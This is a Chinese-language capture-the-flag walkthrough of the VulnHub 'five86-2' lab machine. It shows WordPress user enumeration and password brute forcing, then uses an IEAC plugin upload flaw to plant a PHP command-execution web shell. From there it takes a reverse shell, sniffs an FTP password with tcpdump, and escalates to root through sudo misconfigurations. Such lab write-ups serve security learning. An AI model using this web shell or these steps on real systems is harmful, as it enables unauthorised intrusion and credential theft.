> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.lz80.com](https://www.lz80.com/21140.html)

> 靶机地址：http://www.vulnhub.com/entry/five86-2,418/ 本文涉及知识点实操练习：相关实验：VulnHub 渗透测试实战靶场 Node 1.0 （Node 1.0 是…......

靶机地址：[http://www.vulnhub.com/entry/five86-2,418/](https://www.lz80.com/go?_=25cb5d3c4faHR0cDovL3d3dy52dWxuaHViLmNvbS9lbnRyeS9maXZlODYtMiw0MTgv)

本文涉及知识点实操练习：相关实验：[VulnHub 渗透测试实战靶场 Node 1.0](https://www.lz80.com/go?_=e0b1318345aHR0cHM6Ly93d3cuaGV0aWFubGFiLmNvbS9leHBjLmRvP2VjPUVDSURkYjU4LTRiOWQtNDI3Yi1iN2IzLTgzODJjN2UwYTdmNSZhbXA7cGtfY2FtcGFpZ249ZnJlZWJ1Zi13ZW1lZGlh) （Node 1.0 是一个难度为中等的 Boot2root/CTF 挑战，靶场环境最初由 HackTheBox 创建，实验目的是获取两个 flag）

• 对 WordPress 网站的渗透

– [wpscan](https://www.lz80.com/go?_=9fd3cd3ed6aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvbmV0d29yay9zZWN0b29sLzE3NDY2My5odG1s)

• WordPress 中 IEAC 插件的 RCE 漏洞

– [WordPress 插件 IEAC 漏洞分析及组合利用尝试](https://www.lz80.com/go?_=e36c6d7c5caHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvbmV0d29yay92dWxzLzIwNTczNS5odG1s)

• tcpdump 的使用

– [tcpdump 使用详解](https://www.lz80.com/go?_=09087b32a7aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbHZkb25namllL3AvMTA5MTE1NjQuaHRtbA==)

nmap -sP 参数使用 ping 扫描局域网主机，目的地址为 192.168.56.6

![](https://image.3001.net/images/20210122/1611302751_600a875facedc48d7ea66.jpg!small)

nmap -A 192.168.56.6 -p- 可以看到目标主机的一些信息，-A 是进行操作系统指纹和版本检测，-p- 是全端口

![](https://image.3001.net/images/20210122/1611302753_600a8761dc5ffa96ba1f3.jpg!small)

开放了 22、21、80 端口，并且 80 端口是 WordPress 5.1.4 的 CMS

这里最好提前在 / etc/hosts 中加上 192.168.56.6 five86-2 这一条，因为后面访问 wordpress 的后台 wp-admin 时会跳转到到这个域名

![](https://image.3001.net/images/20210122/1611302754_600a8762e1daf5fdbc6e7.jpg!small)

在 searchsploit 和 Google 并没有发现 WordPress 5.1.4 的漏洞，可以用 wpscan 扫描一下这个 URL。wpscan 是一款针对 WordPress 的扫描器，详细的使用可以参考 [WPScan 使用完整攻略](https://www.lz80.com/go?_=9fd3cd3ed6aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvbmV0d29yay9zZWN0b29sLzE3NDY2My5odG1s)。

默认扫描会返回目标站点的中间件、XML-RPC、readme 文件、上传路径、WP-Corn、版本、主题、所有的插件和备份文件。

命令 wpscan -u [http://192.168.56.6/](https://www.lz80.com/go?_=3b0ec1ad77aHR0cDovLzE5Mi4xNjguNTYuNi8=)

![](https://image.3001.net/images/20210122/1611302755_600a8763e59d69e8f01d2.jpg!small)

这里并没有发现很有用的信息，考虑去枚举用户名，然后配合 rockyou.txt 去爆破密码。爆破用户名命令 wpscan –url [http://192.168.56.6/](https://www.lz80.com/go?_=3b0ec1ad77aHR0cDovLzE5Mi4xNjguNTYuNi8=)–enumerate u，发现了 5 个用户

peteradminbarneygillianstephen

![](https://image.3001.net/images/20210122/1611302757_600a8765d9a1f8362ff32.jpg!small)

爆破密码命令 wpscan –url [http://192.168.56.6/](https://www.lz80.com/go?_=3b0ec1ad77aHR0cDovLzE5Mi4xNjguNTYuNi8=)-U user.txt -P /usr/share/wordlists/rockyou.txt

![](https://image.3001.net/images/20210122/1611302758_600a8766f1d086f330209.png!small)

最终爆破出来两个结果

Username: barney, Password: spooky1Username: stephen, Password: apollo1

使用 barney 登录后台 [http://five86-2/wp-admin/](https://www.lz80.com/go?_=69c853d3cdaHR0cDovL2ZpdmU4Ni0yL3dwLWFkbWluLw==)，可以看到这个站点安装了三个插件，但是只激活了一个 Insert or Embed Articulate Content into WordPress Trial（IEAC）

Akismet Anti-Spam Version 4.1.1Hello Dolly Version 1.7.1IEAC Version 4.2995

![](https://image.3001.net/images/20210122/1611302759_600a8767b97531825d94d.png!small)

在谷歌上搜索一下，不难搜到这个插件的 RCE：[WordPress 插件 IEAC 漏洞分析及组合利用尝试](https://www.lz80.com/go?_=e36c6d7c5caHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvbmV0d29yay92dWxzLzIwNTczNS5odG1s)，在 [exploit-db](https://www.lz80.com/go?_=075cccb5d7aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDY5ODE=) 上也有

先生成 poc.zip，

echo “hello” > index.htmlecho “<?php echo system($_GET[‘cmd’]); ?>” > index.phpzip poc.zip index.html index.php

然后登录 wordpress 后台，选择新建文章

![](https://image.3001.net/images/20210122/1611302760_600a8768b61913b354cb7.png!small)

选择添加区块

![](https://image.3001.net/images/20210122/1611302761_600a87695af0560840529.png!small)

选择 E-Learning

![](https://image.3001.net/images/20210122/1611302762_600a876a20873b82d0667.png!small)

上传 poc.zip

![](https://image.3001.net/images/20210122/1611302762_600a876aa6219c4eef65e.png!small)

选择 Insert As iFrame

![](https://image.3001.net/images/20210122/1611302763_600a876b3a29ec81a1cf1.png!small)

可以看到上传的位置，也就是说上次的 shell 位置为 [http://192.168.56.6/wp-content/uploads/articulate_uploads/poc/index.php](https://www.lz80.com/go?_=97164f8c21aHR0cDovLzE5Mi4xNjguNTYuNi93cC1jb250ZW50L3VwbG9hZHMvYXJ0aWN1bGF0ZV91cGxvYWRzL3BvYy9pbmRleC5waHA=)

![](https://image.3001.net/images/20210122/1611302763_600a876bd8c5dd8e5d3de.png!small)

测试 shell[http://192.168.56.6/wp-content/uploads/articulate_uploads/poc/index.php?cmd=whoami](https://www.lz80.com/go?_=bacc91f2f5aHR0cDovLzE5Mi4xNjguNTYuNi93cC1jb250ZW50L3VwbG9hZHMvYXJ0aWN1bGF0ZV91cGxvYWRzL3BvYy9pbmRleC5waHA/Y21kPXdob2FtaQ==) 这就拿到了 shell

![](https://image.3001.net/images/20210122/1611302764_600a876c6624eb7f791e5.png!small)

使用 php-reverse-shell 去反弹 shell，访问 [http://192.168.56.6/wp-content/uploads/articulate_uploads/poc4/shell.php](https://www.lz80.com/go?_=2b46dc2f71aHR0cDovLzE5Mi4xNjguNTYuNi93cC1jb250ZW50L3VwbG9hZHMvYXJ0aWN1bGF0ZV91cGxvYWRzL3BvYzQvc2hlbGwucGhw) 就可以看到反弹的 shell，还不是 TTY，接下来就想办法变成 TTY 吧

![](https://image.3001.net/images/20210122/1611302765_600a876d1e377c41b7fd3.png!small)

![](https://image.3001.net/images/20210122/1611302765_600a876db7c6ca7c9de17.png!small)

ls /home 发现有 8 个目录，刚刚爆破来两个密码，一个登陆了后台，还有一个没有测试，并且两个都在这 8 个用户里面。可以先试试 su barney，密码填 spooky1，发现失败，再试试 stephen，密码 apollo1。这里的 shell 不知道为什么没有前面的 $ 了，但是可以用

![](https://image.3001.net/images/20210122/1611302766_600a876e6b3b4125fd2bc.png!small)

实际上，这里的 www-data 可以直接使用 python3 -c ‘import pty;pty.spawn(“/bin/bash”)’变成 TTY，这样可能更方便一些

![](https://image.3001.net/images/20210122/1611302767_600a876f24b0f68de1159.png!small)

然后再 sudo -l 发现需要密码，并且不是 spooky1，所以还是 su stephen 吧，发现 stephen 在一个名为 pcap 的用户组中（pcap 不是流量包吗 ^_^）

![](https://image.3001.net/images/20210122/1611302767_600a876fa87862bc74a71.png!small)

然后 sudo -l 发现无法执行 sudo

![](https://image.3001.net/images/20210122/1611302768_600a87704d1ee111f950e.png!small)

回到 pcap 那里，流量包是不是意味着流量分析，尝试 ifconfig 发现没有这个命令，但是可以使用 ip add，发现目前运行着几个网络接口

![](https://image.3001.net/images/20210122/1611302768_600a8770dbf89a0de4999.png!small)

这里的最后一个接口好像是动态的，每次都不一样，可以使用 tcpdump -D 列出可用于抓包的接口。这里选择把后面两个抓下来，因为不怎么常见。抓包命令为 timeout 120 tcpdump -w 1.pcap -i veth2c37c59，其中 timeout 120 是指 2 分钟，-w 是将结果输出到文件，-i 是指定监听端口

![](https://image.3001.net/images/20210122/1611302769_600a8771bd0e7170f2cd0.png!small)

![](https://image.3001.net/images/20210122/1611302770_600a877266240899f86ae.png!small)

可以去分析一下这两个流量包，命令 tcpdump -r 1.pcap，这里 - r 是从给定的流量包读取数据，不难发现 paul 用户 FTP 的密码 esomepasswford。后面 2.pcap 与 1.pcap 内容相同。

![](https://image.3001.net/images/20210122/1611302771_600a8773560385e6b6e73.png!small)

接着 su paul，用上面的那个密码发现可以登陆。尝试 sudo -l 发现 stephen 可以使用 peter 的 service 命令

![](https://image.3001.net/images/20210122/1611302772_600a87749d8c3d7dd32ac.png!small)

那不就可以直接执行 peter 的 / bin/bash 了吗。命令 sudo -u peter service /bin/bash。这里要注意一下目录的问题，用相对目录找到 / bin/bash 的位置

![](https://image.3001.net/images/20210122/1611302773_600a8775440eab506c134.png!small)

获取 peter 的权限后，还是先 sudo -l，发现他可以运行 root 用户的 passwd 命令，这我直接修改 root 的密码不就获取 root 权限了吗

![](https://image.3001.net/images/20210122/1611302773_600a8775d97b87e8ae0e6.png!small)

是时候表演真正的技术了。sudo -u root passwd root(强迫症，全文一致)，用 sudo passwd root 一样的

![](https://image.3001.net/images/20210122/1611302774_600a877671b3dcadf5c77.png!small)

找到 flag

![](https://image.3001.net/images/20210122/1611302775_600a87772d1e4b20f24eb.png!small)